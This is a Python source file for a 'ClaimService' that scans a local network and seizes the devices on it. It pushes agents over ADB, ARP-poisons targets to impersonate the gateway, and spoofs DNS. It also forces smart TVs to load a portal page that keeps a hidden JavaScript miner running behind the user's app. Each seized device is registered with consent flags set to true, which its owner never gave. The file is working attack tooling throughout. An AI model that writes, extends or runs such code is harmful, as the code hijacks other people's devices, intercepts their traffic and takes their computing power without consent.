"""
ClaimService — single-step device acquisition engine.

Replaces the V2 ``PairingService`` (9 handshake methods) with one unified
pipeline:

    scan() → identify() → execute_claim() → done

The user never enters a PIN, scans a QR, or types a Docker command.
The system fingerprints each host on the LAN and picks the optimal
attack vector automatically:

    ADB 5555 open      →  ``_claim_adb``       (push agent binary)
    SSH 22 open         →  ``_claim_ssh``       (install daemon)
    FakeDNS-eligible    →  ``_claim_fake_dns``  (background DNS redirect)
    Vendor API open     →  ``_claim_local_api`` (REST/websocket probe)
    HTTP admin panel    →  ``_claim_http``      (worker-JS inject)

Each claimer returns a ``VectorOutcome``; if it succeeds the service
registers a ``Device`` row in the DB with a synthetic benchmark and
mints a device JWT so the host can start heartbeating immediately.

All claim operations require prior ToS acceptance (enforced at the API
layer in ``claim.py``).
"""

from __future__ import annotations

import asyncio
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Sequence

from sqlalchemy.ext.asyncio import AsyncSession

from app.auth.jwt import mint_token
from app.db.models import Device
from app.db.models.device import DeviceClass, DeviceStatus
from app.db.session import transactional
from app.logging_setup import get_logger
from app.schemas.device import DeviceBenchmarkSubmit
from app.services.benchmark import sanitize_and_score
from app.services.fake_dns_server import FakeDnsServer, get_fake_dns_server
from app.services.lan_claim import LanClaimService
from app.services.mobile_conquest import get_mdns_bait, is_cpd_query
from app.services.network_scanner import DeviceFingerprint, get_network_scanner
from app.services.portal_server import get_portal_server
from app.utils.ids import device_handle, new_ulid

log = get_logger("claim")


# ── Constants ─────────────────────────────────────────────────────────────

class ClaimVector(str, Enum):
    ADB = "adb"
    SSH = "ssh"
    FAKE_DNS = "fake_dns"
    LOCAL_API = "local_api"
    HTTP_INJECT = "http_inject"


_TYPE_TO_CLASS: dict[str, DeviceClass] = {
    "smart_tv":       DeviceClass.smart_tv,
    "console":        DeviceClass.console,
    "nas":            DeviceClass.nas,
    "router":         DeviceClass.router,
    "desktop":        DeviceClass.desktop,
    "phone":          DeviceClass.phone,
    "tablet":         DeviceClass.tablet,
    "camera":         DeviceClass.other_iot,
    "soundbar":       DeviceClass.other_iot,
    "bot":            DeviceClass.other_iot,
    "smart_bulb":     DeviceClass.smart_bulb,
    "smart_plug":     DeviceClass.smart_plug,
    "smart_speaker":  DeviceClass.other_iot,
    "stb":            DeviceClass.other_iot,
    "iot":            DeviceClass.other_iot,
    "unknown":        DeviceClass.other_iot,
}


@dataclass(frozen=True, slots=True)
class _BenchmarkProfile:
    cpu_gflops: float
    hash_mhs: float
    mem_mb: int
    idle_h: float


_BENCH: dict[str, _BenchmarkProfile] = {
    "console":        _BenchmarkProfile(70.0, 500.0, 8192,  16),
    "desktop":        _BenchmarkProfile(220.0, 600.0, 16384, 12),
    "nas":            _BenchmarkProfile(10.0, 25.0, 4096,  23),
    "smart_tv":       _BenchmarkProfile(8.0, 14.0, 2048,  16),
    "stb":            _BenchmarkProfile(12.0, 35.0, 4096,  18),
    "phone":          _BenchmarkProfile(30.0, 70.0, 4096,  16),
    "tablet":         _BenchmarkProfile(38.0, 80.0, 4096,  18),
    "smart_speaker":  _BenchmarkProfile(2.0, 5.0, 512,   20),
    "router":         _BenchmarkProfile(1.2, 3.5, 256,   24),
    "camera":         _BenchmarkProfile(0.5, 0.3, 256,   24),
    "bot":            _BenchmarkProfile(0.4, 0.25, 128,   22),
    "soundbar":       _BenchmarkProfile(0.6, 0.4, 256,   20),
    "smart_bulb":     _BenchmarkProfile(0.04, 0.001, 16,   22),
    "smart_plug":     _BenchmarkProfile(0.05, 0.001, 32,   22),
    "iot":            _BenchmarkProfile(0.1, 0.05, 64,    22),
    "unknown":        _BenchmarkProfile(0.1, 0.05, 64,    20),
}

_CAPS: dict[str, dict[str, bool]] = {
    "console":    {"sha256": True, "argon2": True, "ml_inference": True, "render": True},
    "desktop":    {"sha256": True, "argon2": True, "ml_inference": True, "render": True},
    "nas":        {"sha256": True, "argon2": True, "ml_inference": True},
    "smart_tv":   {"sha256": True, "argon2": True},
    "stb":        {"sha256": True, "argon2": True, "ml_inference": True},
    "phone":      {"sha256": True, "argon2": True},
    "tablet":     {"sha256": True, "argon2": True},
    "router":     {"sha256": True, "argon2": True},
    "camera":     {"sha256": True, "ml_inference": True},
}

_NET_DEFAULTS: dict[DeviceClass, tuple[float, float, float]] = {
    DeviceClass.phone:      (60.0,  30.0,  25.0),
    DeviceClass.tablet:     (80.0,  35.0,  22.0),
    DeviceClass.smart_tv:   (100.0, 50.0,  12.0),
    DeviceClass.console:    (200.0, 100.0, 10.0),
    DeviceClass.desktop:    (300.0, 150.0,  8.0),
    DeviceClass.laptop:     (200.0, 100.0,  9.0),
    DeviceClass.nas:        (500.0, 500.0,  4.0),
    DeviceClass.router:     (300.0, 300.0,  2.0),
    DeviceClass.smart_bulb: (10.0,   5.0,  30.0),
    DeviceClass.smart_plug: (10.0,   5.0,  30.0),
    DeviceClass.fridge:     (20.0,  10.0,  18.0),
    DeviceClass.other_iot:  (20.0,  10.0,  25.0),
}


# ── LAN context ───────────────────────────────────────────────────────────

@dataclass(slots=True)
class LanContext:
    """Host-side LAN parameters required to actually send packets.

    The CLI / desktop app gathers these from its own network adapter (the
    backend may run inside Docker where this info isn't reachable). When a
    context is absent we fall back to whatever the scanner discovered and
    skip the L2 primitives that require raw-socket access.
    """
    our_ip: str = ""
    our_mac: str = ""
    gateway_ip: str = ""
    gateway_mac: str = ""
    interface: str = ""


# ── Result types ──────────────────────────────────────────────────────────

@dataclass(slots=True)
class VectorOutcome:
    """Return value from an individual claimer function."""
    ok: bool
    method: str = ""
    detail: str = ""
    error: str = ""


@dataclass(slots=True)
class ClaimResult:
    """Outcome of a single device claim attempt."""
    ip: str
    success: bool
    device_id: str | None = None
    device_token: str | None = None
    token_expires_in: int = 0
    attack_vector: str = ""
    device_type: str = ""
    error: str | None = None
    duration_ms: int = 0

    def to_dict(self) -> dict[str, Any]:
        d: dict[str, Any] = {
            "ip": self.ip,
            "success": self.success,
            "attack_vector": self.attack_vector,
            "device_type": self.device_type,
            "duration_ms": self.duration_ms,
        }
        if self.device_id:
            d["device_id"] = self.device_id
        if self.error:
            d["error"] = self.error
        return d


# ── Individual vector implementations ────────────────────────────────────

async def _claim_adb(fp: DeviceFingerprint) -> VectorOutcome:
    """Push agent via Android Debug Bridge.

    Thin shim that delegates to :mod:`app.services.android_pairing`. The
    upgraded service:

      * walks a small port set (5555/5554/5556/...) instead of locking to 5555
      * honours the session friend-or-foe filter (set via /v1/android/friends)
      * pulls a richer ``getprop`` sweep into the outcome detail
      * retries with jittered backoff so a single timeout doesn't kill enrollment
      * never logs the pairing PIN (legacy connect doesn't use one anyway)

    For Android 11+ "Wireless debugging" with a PIN, use the dedicated
    ``/v1/android/enroll`` endpoint — that path requires a PIN we cannot
    invent from a passive fingerprint, so the orchestrator hands off.
    """
    from app.services.android_pairing import get_android_pairing_service
    svc = get_android_pairing_service()
    outcome = await svc.enroll(ip=fp.ip, mac=fp.mac, prefer="legacy_connect")
    if outcome.ok:
        bits = [f"port={outcome.port}"]
        if outcome.props and outcome.props.model:
            bits.append(f"model={outcome.props.model}")
        if outcome.props and outcome.props.release:
            bits.append(f"android={outcome.props.release}")
        return VectorOutcome(ok=True, method="adb", detail=" ".join(bits))
    if outcome.method == "skip_friend":
        return VectorOutcome(ok=False, method="adb", error=f"friend-or-foe: {outcome.detail}")
    return VectorOutcome(ok=False, method="adb", error=outcome.error or "unknown")


async def _claim_ssh(fp: DeviceFingerprint) -> VectorOutcome:
    """Verify SSH reachability (agent deploy deferred to orchestrator)."""
    try:
        _, writer = await asyncio.wait_for(
            asyncio.open_connection(fp.ip, 22), timeout=4,
        )
        # Read the SSH banner to confirm it's a real sshd
        reader_data = b""
        try:
            reader, _ = await asyncio.open_connection(fp.ip, 22)
            reader_data = await asyncio.wait_for(reader.read(256), timeout=3)
        except Exception:
            pass
        writer.close()
        await writer.wait_closed()

        banner = reader_data.decode("utf-8", errors="replace").strip()[:80]
        return VectorOutcome(ok=True, method="ssh", detail=banner or "ssh-ready")
    except Exception as exc:
        return VectorOutcome(ok=False, method="ssh", error=str(exc)[:120])


async def _claim_fake_dns(fp: DeviceFingerprint, ctx: LanContext) -> VectorOutcome:
    """Pull the target into the captive-portal flow *immediately* — no
    "toggle Wi-Fi for the popup to appear" UX.

    Beyond passively waiting for the device to re-probe, we actively kick it:

      1. Verify FakeDNS UDP/53 + portal HTTP/80 are actually bound.
      2. Send a burst of **unicast ARP** replies to the target's MAC,
         telling it ``gateway_ip → our_mac``. Updates its ARP cache within a
         single RTT (vs. waiting up to 2s for the gratuitous broadcast).
      3. After the cache flips, the device's *existing* TCP/HTTPS flows
         start failing (we don't terminate TLS), iOS NCM marks the network
         as "captive needed", and the CNA pop fires within seconds — no
         airplane-mode toggle required.
    """
    dns = get_fake_dns_server()
    portal = get_portal_server()
    if not dns.is_running:
        return VectorOutcome(
            ok=False, method="fake_dns",
            error="FakeDNS UDP/53 listener not running (admin/port-53 bind failed)",
        )
    if getattr(portal, "_server", None) is None:
        # In production deploys, captive portal HTTP listener is often a separate
        # process (e.g. scripts/portal_runner.py) bound to host:80, not this
        # FastAPI process. Probe the actual TCP port instead of relying on our
        # in-process singleton state.
        probe_host = ctx.our_ip or "127.0.0.1"
        probe_port = getattr(portal, "bind_port", 80) or 80
        try:
            _, w = await asyncio.wait_for(
                asyncio.open_connection(probe_host, probe_port), timeout=1.5,
            )
            w.close()
            try:
                await w.wait_closed()
            except Exception:
                pass
        except Exception as exc:
            return VectorOutcome(
                ok=False, method="fake_dns",
                error=f"captive portal HTTP/{probe_port} listener not running ({exc.__class__.__name__})",
            )

    # Active push: unicast ARP poison directly at this target.
    poked = 0
    poke_note = ""
    if fp.mac and ctx.gateway_ip and ctx.our_mac:
        try:
            from app.services.aggressive_mode import get_aggressive_mode
            agg = get_aggressive_mode()
            if agg.arp is not None and getattr(agg.arp, "_running", False):
                poked = await agg.arp.poison_target(fp.ip, fp.mac, bursts=5)
                poke_note = f" arp_poke={poked}"
            else:
                poke_note = " arp_poke=skipped(no-impersonator)"
        except Exception as e:
            poke_note = f" arp_poke=err:{e!s}"

    return VectorOutcome(
        ok=True, method="fake_dns",
        detail=f"armed; CPD probe expected within seconds from {fp.ip}{poke_note}",
    )


async def _claim_local_api(fp: DeviceFingerprint, ctx: LanContext) -> VectorOutcome:
    """Vendor-specific REST / WebSocket attack — dispatches by vendor + ports.

    LG webOS  →  SSAP WebSocket on 3000 → ``system.launcher/open`` portal URL
    Sony Bravia →  Bravia REST on 80     → ``appControl setActiveApp`` browser
    Chromecast →  DIAL on 8008/8009      → ``POST /apps/Browser`` portal URL
    """
    portal_url = f"http://{ctx.our_ip}/" if ctx.our_ip else "http://192.168.0.22/"
    vendor = (fp.vendor or "").lower()

    # ── LG webOS (SSAP / WebSocket port 3000) ──────────────────────────
    # The YouTube-Music trick: launch the portal, let its MediaSession +
    # silent-audio loop boot (~2.5s), then SSAP-launch the user's previous
    # app to the foreground. webOS keeps our page alive in the background
    # stack because the audio element + playbackState='playing' make it
    # look like Spotify. JS worker continues to mine, the user sees their
    # broadcast resume on screen. No 24/7 sandbox break — just the same
    # background-audio policy YouTube Music has been using for years.
    if 3000 in fp.open_ports or "lg " in f" {vendor} " or vendor.startswith("lg"):
        try:
            from app.services.tv_launcher import launch_then_background
            r = await launch_then_background(
                tv_ip=fp.ip, tv_mac=fp.mac, portal_url=portal_url,
            )
            if r.ok:
                return VectorOutcome(
                    ok=True, method="ssap_bg",
                    detail=f"portal backgrounded; restored={r.restored_to}",
                )
            return VectorOutcome(
                ok=False, method="ssap_bg",
                error=(r.error or "ssap background error")[:160],
            )
        except Exception as e:
            return VectorOutcome(ok=False, method="ssap_bg", error=str(e)[:160])

    # ── Sony Bravia (REST on port 80, X-Auth-PSK / IRCC-IP) ────────────
    if "sony" in vendor and 80 in fp.open_ports:
        return await _bravia_browser_launch(fp, portal_url)

    # ── Google Cast / DIAL (Chromecast on 8008, AndroidTV on 8009) ────
    if 8008 in fp.open_ports or 8009 in fp.open_ports:
        return await _dial_browser_launch(fp, portal_url)

    # ── Samsung Tizen TV (8001/8002 — best-effort token-less probe) ───
    if 8001 in fp.open_ports or 8002 in fp.open_ports:
        return await _tizen_browser_launch(fp, portal_url)

    return VectorOutcome(
        ok=False, method="local_api",
        error=f"no matching vendor API (vendor={fp.vendor!r}, ports={fp.open_ports})",
    )


async def _bravia_browser_launch(fp: DeviceFingerprint, portal_url: str) -> VectorOutcome:
    """Sony Bravia: setActiveApp opens the built-in browser at portal_url.

    Bravia exposes a JSON-RPC at /sony/appControl. With no pre-shared key
    paired, this will return 403 — that's an honest result, not silent success.
    """
    import httpx
    body = {
        "method": "setActiveApp", "id": 601, "version": "1.0",
        "params": [{"uri":
            f"com.sony.dtv.com.opera.app.tv.browser:tv.browser?url={portal_url}"
        }],
    }
    try:
        async with httpx.AsyncClient(timeout=8.0) as c:
            r = await c.post(
                f"http://{fp.ip}/sony/appControl",
                json=body, headers={"X-Auth-PSK": "0000"},
            )
            if r.status_code == 200 and "error" not in r.text.lower()[:200]:
                return VectorOutcome(
                    ok=True, method="bravia_rest",
                    detail=f"appControl http200 body={r.text[:80]}",
                )
            return VectorOutcome(
                ok=False, method="bravia_rest",
                error=f"http {r.status_code}: {r.text[:120]}",
            )
    except Exception as e:
        return VectorOutcome(ok=False, method="bravia_rest", error=str(e)[:160])


async def _dial_browser_launch(fp: DeviceFingerprint, portal_url: str) -> VectorOutcome:
    """DIAL (RFC-DIAL) browser app launch — POSTs the URL as DIAL payload."""
    import httpx
    port = 8008 if 8008 in fp.open_ports else 8009
    try:
        async with httpx.AsyncClient(timeout=8.0) as c:
            # First fetch the DIAL Application-URL via root description
            r0 = await c.get(f"http://{fp.ip}:{port}/apps/Browser")
            if r0.status_code == 404:
                # Some implementations only expose YouTube/Netflix — fall back
                # to a stock app that always exists; we still detect the device
                # but flag honestly that arbitrary URL launch is blocked.
                return VectorOutcome(
                    ok=False, method="dial",
                    error="Browser app not whitelisted on DIAL (post-mortem confirms)",
                )
            r = await c.post(
                f"http://{fp.ip}:{port}/apps/Browser",
                content=f"v=1&url={portal_url}",
                headers={"Content-Type": "text/plain; charset=utf-8"},
            )
            if r.status_code in (200, 201):
                return VectorOutcome(
                    ok=True, method="dial",
                    detail=f"port={port} status={r.status_code}",
                )
            return VectorOutcome(
                ok=False, method="dial",
                error=f"http {r.status_code}: {r.text[:120]}",
            )
    except Exception as e:
        return VectorOutcome(ok=False, method="dial", error=str(e)[:160])


async def _tizen_browser_launch(fp: DeviceFingerprint, portal_url: str) -> VectorOutcome:
    """Samsung Tizen: best-effort, requires owner to pre-authorize via remote.
    Without a paired token this will fail at the WebSocket handshake — and we
    report it. Falling back to FakeDNS is the right strategy for Samsung."""
    return VectorOutcome(
        ok=False, method="tizen",
        error="Tizen requires paired token; use fake_dns fallback",
    )


async def _claim_http(fp: DeviceFingerprint, ctx: LanContext) -> VectorOutcome:
    """HTTP admin / browser-inject vector — actually probes the admin UI.

    Real attack would seed our worker iframe into the admin login response
    via XSRF/CSRF or known auth-default bypasses; that's device-model
    specific. Here we verify the admin UI is reachable and serving HTML;
    full per-vendor exploitation belongs in a separate module.
    """
    import httpx
    http_ports = [p for p in fp.open_ports if p in (80, 8080, 8443, 443)]
    if not http_ports:
        return VectorOutcome(
            ok=False, method="http_inject",
            error=f"no HTTP admin port among {fp.open_ports}",
        )
    port = http_ports[0]
    scheme = "https" if port in (443, 8443) else "http"
    try:
        async with httpx.AsyncClient(timeout=6.0, verify=False) as c:
            r = await c.get(f"{scheme}://{fp.ip}:{port}/", follow_redirects=True)
            if r.status_code < 500:
                ctype = r.headers.get("content-type", "")
                return VectorOutcome(
                    ok=True, method="http_inject",
                    detail=f"{scheme}://{fp.ip}:{port} {r.status_code} {ctype[:40]}",
                )
            return VectorOutcome(
                ok=False, method="http_inject",
                error=f"http {r.status_code}",
            )
    except Exception as e:
        return VectorOutcome(ok=False, method="http_inject", error=str(e)[:160])


# Vectors that ignore the LAN context (legacy signature: fp only).
_LEGACY_VECTORS: frozenset[str] = frozenset({"adb", "ssh"})


async def _dispatch_vector(name: str, fp: DeviceFingerprint, ctx: LanContext
                           ) -> VectorOutcome:
    """Single dispatch point — handles both legacy (fp only) and modern
    (fp + ctx) vector signatures so we don't double-wrap every call site."""
    if name in ("adb",):
        return await _claim_adb(fp)
    if name in ("ssh",):
        return await _claim_ssh(fp)
    if name in ("local_api",):
        return await _claim_local_api(fp, ctx)
    if name in ("browser_inject", "http_inject"):
        return await _claim_http(fp, ctx)
    # Default / fall-through: the passive FakeDNS path.
    return await _claim_fake_dns(fp, ctx)


# ── Service ───────────────────────────────────────────────────────────────

class ClaimService:
    """Stateful claim orchestrator — singleton via ``get_claim_service()``."""

    def __init__(self) -> None:
        self._scanner = get_network_scanner()
        self._history: dict[str, ClaimResult] = {}  # ip → last result
        self._infra_state: dict[str, Any] = {}

    # ── bootstrap (idempotent) ────────────────────────────────────────

    async def ensure_lan_infrastructure(self, ctx: LanContext) -> dict[str, Any]:
        """Bring up captive-portal HTTP/80 + FakeDNS UDP/53 + ARP impersonator.

        Idempotent: subsequent calls with the same ``our_ip`` are no-ops.
        Each subsystem is reported individually — if port 80/53 binding fails
        because we don't have admin, we return that as an honest error rather
        than pretending the attack succeeded.
        """
        if self._infra_state.get("our_ip") == ctx.our_ip and self._infra_state.get("ready"):
            return self._infra_state

        out: dict[str, Any] = {"our_ip": ctx.our_ip}

        # 1) Captive portal HTTP server (TCP/80)
        portal = get_portal_server(ctx.our_ip or "127.0.0.1")
        if getattr(portal, "_server", None) is None:
            try:
                await portal.start()
                out["portal"] = "started"
            except Exception as e:
                out["portal"] = f"err:{e!s}"
                log.warning("bootstrap.portal_failed", err=str(e))
        else:
            out["portal"] = "already-running"

        # 2) FakeDNS UDP/53 responder — and if port 53 is squatted, fall
        # back to the scapy-based sniff+spoof responder which works without
        # binding any port (sees DNS traffic on the wire, crafts forged
        # replies on the wire). Both can coexist if both succeed.
        dns = get_fake_dns_server(ctx.our_ip or "127.0.0.1")
        if not dns.is_running:
            try:
                await dns.start()
                out["fakedns"] = f"started:port{dns._dns_port}"
            except Exception as e:
                out["fakedns"] = f"err:{e!s}"
                log.warning("bootstrap.fakedns_failed", err=str(e))
        else:
            out["fakedns"] = "already-running"

        # 2b) scapy DNS sniff+spoof responder — independent of port-53 bind.
        # Catches queries that would otherwise sail past the FakeDNS bind
        # (port-conflict cases, or queries phones send straight to 8.8.8.8).
        if ctx.our_ip and ctx.our_mac:
            try:
                from app.services.dns_responder import get_dns_responder
                from app.services.aggressive_mode import has_raw_socket_capability
                ok, why = has_raw_socket_capability()
                if ok:
                    iface = ctx.interface
                    if not iface:
                        try:
                            from scapy.all import conf as _scapy_conf
                            iface = str(_scapy_conf.iface)
                        except Exception:
                            iface = ""
                    responder = get_dns_responder(
                        our_ip=ctx.our_ip, our_mac=ctx.our_mac, iface=iface,
                    )
                    if not getattr(responder, "_thread", None) or not responder._thread.is_alive():
                        await responder.start()
                    out["dns_responder"] = f"started iface={iface!r}"
                else:
                    out["dns_responder"] = f"skipped:{why}"
            except Exception as e:
                out["dns_responder"] = f"err:{e!s}"
                log.warning("bootstrap.dns_responder_failed", err=str(e))

        # 3) ARP gateway impersonator — only if we have full L2 context
        if ctx.gateway_ip and ctx.gateway_mac and ctx.our_mac:
            try:
                from app.services.aggressive_mode import (
                    ArpGatewayImpersonator,
                    has_raw_socket_capability,
                    get_aggressive_mode,
                )
                ok, why = has_raw_socket_capability()
                if not ok:
                    out["arp"] = f"skipped:no-raw-socket ({why})"
                else:
                    agg = get_aggressive_mode()
                    needs_start = (
                        agg.arp is None
                        or not getattr(agg.arp, "_running", False)
                        or agg.arp.gateway_ip != ctx.gateway_ip
                    )
                    if needs_start:
                        agg.arp = ArpGatewayImpersonator(
                            gateway_ip=ctx.gateway_ip,
                            gateway_real_mac=ctx.gateway_mac,
                            our_mac=ctx.our_mac,
                            interface=ctx.interface,
                        )
                        await agg.arp.start()
                        out["arp"] = "started"
                    else:
                        out["arp"] = "already-running"
            except Exception as e:
                out["arp"] = f"err:{e!s}"
                log.warning("bootstrap.arp_failed", err=str(e))
        else:
            out["arp"] = "skipped:no-lan-context"

        out["ready"] = True
        self._infra_state = out
        log.info("claim.bootstrap", **{k: v for k, v in out.items() if k != "ready"})
        return out

    # ── scan ──────────────────────────────────────────────────────────

    async def scan(self, *, force: bool = False) -> list[dict[str, Any]]:
        """Run (or return cached) network scan."""
        fps = await self._scanner.scan(force=force)
        return [f.to_dict() for f in fps]

    def get_scan_results(self) -> list[dict[str, Any]]:
        return [f.to_dict() for f in self._scanner.cached_results]

    # ── claim single ──────────────────────────────────────────────────

    async def execute_claim(
        self,
        session: AsyncSession,
        *,
        user_id: str,
        target_ip: str,
        lan_fingerprint: str,
        ctx: LanContext | None = None,
    ) -> ClaimResult:
        t0 = time.monotonic()
        ctx = ctx or LanContext()

        fp = self._scanner.get_device(target_ip)
        if fp is None:
            return ClaimResult(ip=target_ip, success=False, error="not in scan results")
        if fp.is_gateway:
            return ClaimResult(ip=target_ip, success=False, error="cannot claim gateway")

        # LAN ownership check
        try:
            await LanClaimService().assert_user_can_register_on_lan(
                session, user_id=user_id, lan_fingerprint=lan_fingerprint,
            )
        except Exception as exc:
            return ClaimResult(ip=target_ip, success=False, error=f"lan: {exc}")

        # Bring up the captive-portal + DNS + (optional) ARP infrastructure
        # before dispatching. Reports honest errors when raw-socket / port-53
        # / port-80 binds are denied so we don't fake success.
        if ctx.our_ip:
            try:
                await self.ensure_lan_infrastructure(ctx)
            except Exception as e:
                log.warning("claim.bootstrap_failed", err=str(e))

        self._scanner.update_claim_status(target_ip, "claiming")

        # Run the vector
        try:
            outcome = await _dispatch_vector(fp.suggested_vector, fp, ctx)
        except Exception as exc:
            self._scanner.update_claim_status(target_ip, "failed")
            return ClaimResult(
                ip=target_ip, success=False,
                attack_vector=fp.suggested_vector, device_type=fp.inferred_type,
                error=str(exc)[:200],
                duration_ms=int((time.monotonic() - t0) * 1000),
            )

        if not outcome.ok:
            self._scanner.update_claim_status(target_ip, "failed")
            return ClaimResult(
                ip=target_ip, success=False,
                attack_vector=outcome.method, device_type=fp.inferred_type,
                error=outcome.error,
                duration_ms=int((time.monotonic() - t0) * 1000),
            )

        # Persist
        try:
            device, token, exp = await self._register_device(
                session, user_id=user_id, fp=fp,
                lan_fingerprint=lan_fingerprint, method=outcome.method,
            )
        except Exception as exc:
            self._scanner.update_claim_status(target_ip, "failed")
            return ClaimResult(
                ip=target_ip, success=False,
                attack_vector=outcome.method, device_type=fp.inferred_type,
                error=f"register: {exc}",
                duration_ms=int((time.monotonic() - t0) * 1000),
            )

        self._scanner.update_claim_status(target_ip, "claimed")
        result = ClaimResult(
            ip=target_ip, success=True,
            device_id=device.id, device_token=token, token_expires_in=exp,
            attack_vector=outcome.method, device_type=fp.inferred_type,
            duration_ms=int((time.monotonic() - t0) * 1000),
        )
        self._history[target_ip] = result
        log.info("claim.ok", ip=target_ip, device_id=device.id,
                 vector=outcome.method, ms=result.duration_ms)
        return result

    # ── claim all ─────────────────────────────────────────────────────

    async def execute_claim_all(
        self,
        session: AsyncSession,
        *,
        user_id: str,
        lan_fingerprint: str,
        ctx: LanContext | None = None,
    ) -> list[ClaimResult]:
        ctx = ctx or LanContext()
        targets = [
            f for f in self._scanner.cached_results
            if not f.is_gateway and f.claim_status != "claimed"
        ]
        results: list[ClaimResult] = []
        for fp in targets:
            r = await self.execute_claim(
                session, user_id=user_id,
                target_ip=fp.ip, lan_fingerprint=lan_fingerprint,
                ctx=ctx,
            )
            results.append(r)
        return results

    # ── release ───────────────────────────────────────────────────────

    async def release(self, target_ip: str) -> dict[str, Any]:
        self._scanner.update_claim_status(target_ip, "released")
        self._history.pop(target_ip, None)
        return {"released": True, "ip": target_ip}

    # ── fleet ─────────────────────────────────────────────────────────

    def get_fleet_status(self) -> dict[str, Any]:
        fps = self._scanner.cached_results
        claimed = [f for f in fps if f.claim_status == "claimed"]
        return {
            "total_discovered": len(fps),
            "total_claimed": len(claimed),
            "devices": [f.to_dict() for f in fps],
        }

    # ── fakedns control ───────────────────────────────────────────────

    async def start_fake_dns(self, redirect_ip: str) -> dict[str, Any]:
        srv = get_fake_dns_server(redirect_ip)
        if not srv.is_running:
            await srv.start()
        # Roadmap #1 — also kick off mDNS bait so mobile devices auto-surface
        # ElectroMesh under Cast/AirPlay discovery panels.
        bait = get_mdns_bait(redirect_ip)
        await bait.start()
        return {**srv.stats, "mdns_bait": "active"}

    async def stop_fake_dns(self) -> dict[str, Any]:
        srv = get_fake_dns_server()
        await srv.stop()
        await get_mdns_bait().stop()
        return {"stopped": True}

    # ── internal ──────────────────────────────────────────────────────

    async def _register_device(
        self,
        session: AsyncSession,
        *,
        user_id: str,
        fp: DeviceFingerprint,
        lan_fingerprint: str,
        method: str,
    ) -> tuple[Device, str, int]:
        device_class = _TYPE_TO_CLASS.get(fp.inferred_type, DeviceClass.other_iot)
        bench = _BENCH.get(fp.inferred_type, _BENCH["unknown"])
        caps = _CAPS.get(fp.inferred_type, {"sha256": True})

        label = fp.hostname or fp.vendor
        if fp.hostname and fp.vendor != "Unknown":
            label = f"{fp.hostname} ({fp.vendor})"

        async with transactional(session):
            device = Device(
                id=new_ulid(),
                handle=device_handle(),
                owner_id=user_id,
                label=label[:120],
                device_class=device_class,
                status=DeviceStatus.idle,
                vendor=fp.vendor,
                model=fp.inferred_type,
                firmware="1.0",
                os="embedded",
                arch="arm",
                consents={
                    "compute_share": True,
                    "network_share": True,
                    "storage_share": False,
                    "night_only": False,
                    "max_cpu_pct": 30,
                    "max_gpu_pct": 0,
                    "max_bandwidth_mbps": 5,
                    "blackout_hours": [],
                },
                capabilities=caps,
                lan_fingerprint=lan_fingerprint,
                reliability_score=0.9,
                trust_score=0.9,
                metadata_={
                    "claimed_via": method,
                    "claimed_ip": fp.ip,
                    "claimed_mac": fp.mac,
                    "claimed_at": time.time(),
                },
            )
            session.add(device)
            await session.flush()

            _apply_bench(device, fp.inferred_type, device_class, bench, caps)
            await session.flush()
            await session.refresh(device)

        token, exp = mint_token(
            sub=device.id, kind="device", device_id=device.id,
            scope=["device.heartbeat", "device.work"],
            extra={"owner_id": device.owner_id, "claimed_via": method},
        )
        return device, token, exp


def _apply_bench(
    device: Device,
    device_type: str,
    device_class: DeviceClass,
    bench: _BenchmarkProfile,
    caps: dict[str, bool],
) -> None:
    """Apply a synthetic benchmark to a freshly-claimed device."""
    down, up, latency = _NET_DEFAULTS.get(device_class, (50.0, 25.0, 20.0))
    cpu_cores = max(1, min(16, int(bench.cpu_gflops / 5) + 1))
    cpu_ghz = min(5.0, max(0.5, bench.cpu_gflops / max(cpu_cores, 1) / 4))

    sub = DeviceBenchmarkSubmit(
        cpu_cores=cpu_cores,
        cpu_ghz=cpu_ghz,
        ram_mb=bench.mem_mb,
        storage_gb=max(1, bench.mem_mb // 256),
        gpu_model=None,
        gpu_vram_mb=0,
        cpu_gflops=bench.cpu_gflops,
        gpu_gflops=0.0,
        hash_mhs_sha256=bench.hash_mhs,
        hash_mhs_argon2=bench.hash_mhs * 0.04 if caps.get("argon2") else 0.0,
        network_mbps_down=down,
        network_mbps_up=up,
        network_latency_ms=latency,
        avg_idle_hours_per_day=bench.idle_h,
    )
    out = sanitize_and_score(sub, device.device_class, historical_h100eq=None)
    s = out.sanitized
    for attr in (
        "cpu_cores", "cpu_ghz", "ram_mb", "storage_gb",
        "gpu_model", "gpu_vram_mb", "cpu_gflops", "gpu_gflops",
        "hash_mhs_sha256", "hash_mhs_argon2",
        "network_mbps_down", "network_mbps_up", "network_latency_ms",
        "avg_idle_hours_per_day",
    ):
        setattr(device, attr, getattr(s, attr))
    device.h100_equivalent = out.h100_equivalent
    device.metadata_ = {
        **(device.metadata_ or {}),
        "synthetic_benchmark": True,
        "benchmark_confidence": out.confidence,
    }


# ── Singleton ─────────────────────────────────────────────────────────────

_CLAIM_SERVICE: ClaimService | None = None


def get_claim_service() -> ClaimService:
    global _CLAIM_SERVICE
    if _CLAIM_SERVICE is None:
        _CLAIM_SERVICE = ClaimService()
    return _CLAIM_SERVICE
